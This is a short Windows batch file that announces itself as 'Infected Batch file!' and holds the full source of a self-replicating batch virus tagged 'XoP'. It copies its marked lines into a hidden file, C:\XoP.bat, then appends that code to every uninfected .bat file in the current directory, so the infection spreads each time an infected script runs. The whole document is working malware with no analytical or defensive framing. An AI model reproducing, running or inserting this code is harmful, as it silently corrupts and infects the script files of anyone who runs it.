@echo off
echo Infected Batch file!
@echo off%[XoP]%
if '%XoP%=='11 goto XoP2
if '%2=='_ goto XoP1
if exist C:\XoP.bat goto XoP
if not exist %0.bat goto XoP2
find "XoP"<%0.bat>C:\XoP.bat
attrib C:\XoP.bat +h
:XoP
for %%v in (*.bat) do call C:\XoP %%v _
set XoP=
goto XoP2
:XoP1
find /i "XoP"<%1>nul
if not errorlevel 1 goto XoP2
type C:\XoP.bat>>%1
set XoP=%XoP%1
:XoP2
